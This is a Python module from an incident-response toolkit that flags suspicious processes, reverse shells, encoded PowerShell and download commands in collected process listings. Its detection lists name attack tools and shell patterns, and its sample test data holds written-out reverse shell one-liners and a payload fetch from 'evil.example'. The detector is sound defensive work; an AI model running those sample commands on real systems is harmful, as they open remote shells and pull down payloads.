"""
============================================================
Claus Incident Response Toolkit (CIRT)

Suspicious Process Detection Engine

Author : Claudias Musavini Misiko
Version: 1.0.0

Analyzes collected running processes and identifies
Indicators of Compromise (IOCs).

This module is operating-system independent and works
with evidence collected from both Linux and Windows.

============================================================
"""

import re

from logger import logger
from ioc.helpers import normalize_text
from ioc.indicators import (
    SUSPICIOUS_PROCESSES,
    LOLBINS,
    IOC_RISK_SCORES,
)


# ==========================================================
# Process Detector
# ==========================================================

class SuspiciousProcessDetector:
    """
    Detect suspicious processes from collected evidence.
    """

    def __init__(self):

        logger.info("=" * 60)
        logger.info("Initializing Suspicious Process Detector")
        logger.info("=" * 60)

        self.findings = []

        self.total_scanned = 0

        self.total_matches = 0


# ==========================================================
# Normalize Process Name
# ==========================================================

    def normalize_process_name(self, process_name):
        """
        Normalize process names before IOC comparison.
        """

        if not process_name:

            return ""

        process_name = process_name.lower()

        process_name = process_name.strip()

        process_name = process_name.replace('"', "")

        process_name = process_name.replace("'", "")

        process_name = process_name.split("/")[-1]

        return process_name


# ==========================================================
# Determine Severity
# ==========================================================

    def determine_severity(self, process_name):
        """
        Assign severity based on process.
        """

        critical = {

            "mimikatz",

            "meterpreter",

            "beacon",

            "cobaltstrike",

            "sliver",

        }

        high = {

            "netcat",

            "nc",

            "ncat",

            "socat",

            "msfconsole",

            "msfvenom",

            "hydra",

            "hashcat",

            "john",

        }

        medium = {

            "nmap",

            "masscan",

            "zmap",

            "tcpdump",

            "wireshark",

            "tshark",

        }

        if process_name in critical:

            return "critical"

        if process_name in high:

            return "high"

        if process_name in medium:

            return "medium"

        if process_name in LOLBINS:

            return "low"

        return "informational"


# ==========================================================
# Create Finding
# ==========================================================

    def create_finding(
        self,
        process_name,
        severity,
        reason,
    ):
        """
        Create a standardized IOC finding.
        """

        return {

            "process": process_name,

            "severity": severity,

            "score": IOC_RISK_SCORES[severity],

            "reason": reason,

        }

# ==========================================================
# Scan Process List
# ==========================================================

    def scan_processes(
        self,
        process_output,
    ):
        """
        Scan a block of process output for suspicious processes.

        Parameters
        ----------
        process_output : str

        Returns
        -------
        list
        """

        logger.info("Scanning running processes...")

        self.findings = []

        self.total_scanned = 0

        self.total_matches = 0

        if not process_output:

            logger.warning("No running process data supplied.")

            return []

        for line in process_output.splitlines():

            line = line.strip()

            if not line:

                continue

            self.total_scanned += 1

            self.scan_line(line)

        logger.info(
            "Scanned %d process entries.",
            self.total_scanned,
        )

        logger.info(
            "Detected %d suspicious processes.",
            self.total_matches,
        )

        return self.findings


# ==========================================================
# Scan Single Process Line
# ==========================================================

    def scan_line(
        self,
        line,
    ):
        """
        Analyze one process entry.
        """

        line_lower = line.lower()

        matched = False

        # --------------------------------------------------
        # Exact IOC Matches
        # --------------------------------------------------

        for process in SUSPICIOUS_PROCESSES:

            pattern = r"\b" + re.escape(process.lower()) + r"\b"

            if re.search(pattern, line_lower):

                severity = self.determine_severity(process)

                finding = self.create_finding(

                    process_name=process,

                    severity=severity,

                    reason="Matched IOC process database.",

                )

                self.findings.append(finding)

                self.total_matches += 1

                logger.warning(

                    "IOC Match: %s (%s)",

                    process,

                    severity.upper(),

                )

                matched = True

                break

        if matched:

            return


# ==========================================================
# LOLBin Detection
# ==========================================================

        for binary in LOLBINS:

            pattern = r"\b" + re.escape(binary.lower()) + r"\b"

            if re.search(pattern, line_lower):

                finding = self.create_finding(

                    process_name=binary,

                    severity="low",

                    reason="Living-Off-The-Land Binary detected.",

                )

                self.findings.append(finding)

                self.total_matches += 1

                logger.info(

                    "LOLBin detected: %s",

                    binary,

                )

                return
# ==========================================================
# Reverse Shell Detection
# ==========================================================

    def detect_reverse_shells(
        self,
        process_output,
    ):
        """
        Detect common reverse shell command patterns.
        """

        logger.info("Checking for reverse shell patterns...")

        if not process_output:

            return

        patterns = [

            "bash -i",

            "/dev/tcp/",

            "nc -e",

            "ncat -e",

            "mkfifo",

            "python -c",

            "python3 -c",

            "perl -e",

            "php -r",

            "ruby -e",

            "socat tcp",

        ]

        data = process_output.lower()

        for pattern in patterns:

            if pattern.lower() in data:

                finding = self.create_finding(

                    process_name=pattern,

                    severity="critical",

                    reason="Possible reverse shell detected.",

                )

                self.findings.append(finding)

                self.total_matches += 1

                logger.warning(

                    "Reverse shell pattern detected: %s",

                    pattern,

                )


# ==========================================================
# Encoded PowerShell Detection
# ==========================================================

    def detect_encoded_powershell(
        self,
        process_output,
    ):
        """
        Detect encoded PowerShell execution.
        """

        if not process_output:

            return

        data = process_output.lower()

        indicators = [

            "-enc",

            "-encodedcommand",

            "frombase64string",

            "iex(",

            "invoke-expression",

        ]

        for indicator in indicators:

            if indicator in data:

                finding = self.create_finding(

                    process_name="powershell",

                    severity="high",

                    reason="Encoded PowerShell execution detected.",

                )

                self.findings.append(finding)

                self.total_matches += 1

                logger.warning(

                    "Encoded PowerShell detected."

                )

                break


# ==========================================================
# Suspicious Command-Line Detection
# ==========================================================

    def detect_suspicious_commands(
        self,
        process_output,
    ):
        """
        Detect suspicious command-line activity.
        """

        if not process_output:

            return

        data = process_output.lower()

        suspicious_commands = [

            "chmod 777",

            "curl http",

            "wget http",

            "scp ",

            "ftp ",

            "tftp ",

            "certutil -urlcache",

            "bitsadmin",

            "regsvr32",

            "rundll32",

            "mshta",

            "wmic process",

        ]

        for command in suspicious_commands:

            if command in data:

                finding = self.create_finding(

                    process_name=command,

                    severity="medium",

                    reason="Suspicious command-line activity detected.",

                )

                self.findings.append(finding)

                self.total_matches += 1

                logger.info(

                    "Suspicious command detected: %s",

                    command,

                )


# ==========================================================
# Summary
# ==========================================================

    def summary(self):
        """
        Return a summary of IOC findings.
        """

        return {

            "success": True,

            "total_scanned": self.total_scanned,

            "total_findings": self.total_matches,

            "findings": self.findings,

        }
# ==========================================================
# Analyze Evidence
# ==========================================================

    def analyze(
        self,
        evidence,
    ):
        """
        Analyze collected evidence.

        Parameters
        ----------
        evidence : dict

        Returns
        -------
        dict
        """

        logger.info("=" * 60)
        logger.info("Starting suspicious process analysis")
        logger.info("=" * 60)

        process_output = normalize_text(
            evidence.get("running_processes")
        )

        self.scan_processes(process_output)

        self.detect_reverse_shells(process_output)

        self.detect_encoded_powershell(process_output)

        self.detect_suspicious_commands(process_output)

        logger.info("=" * 60)
        logger.info("Suspicious process analysis completed")
        logger.info("=" * 60)

        return self.summary()


# ==========================================================
# Standalone Test
# ==========================================================

if __name__ == "__main__":

    logger.info("=" * 60)
    logger.info("Standalone Suspicious Process Detector")
    logger.info("=" * 60)

    sample_processes = """
root         1     0 systemd
root       210 sshd
root       450 python3
root       600 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
user       720 curl http://evil.example/payload.sh
user       830 nc -e /bin/bash 10.10.10.20 4444
user       910 mimikatz
user      1000 powershell.exe -EncodedCommand SGVsbG8=
"""

    detector = SuspiciousProcessDetector()

    results = detector.analyze(

        {

            "running_processes": sample_processes

        }

    )

    print()

    print("=" * 60)
    print("SUSPICIOUS PROCESS DETECTOR")
    print("=" * 60)

    print(f"Processes Scanned : {results['total_scanned']}")
    print(f"IOC Findings      : {results['total_findings']}")

    print()

    if results["findings"]:

        print("Detected Indicators")

        print()

        for finding in results["findings"]:

            print(
                f"[{finding['severity'].upper():12}] "
                f"{finding['process']} "
                f"({finding['score']})"
            )

            print(
                f"Reason : {finding['reason']}"
            )

            print()

    else:

        print("No suspicious processes detected.")

    print("=" * 60)

    logger.info("Standalone detector completed.")
    logger.info("=" * 60)
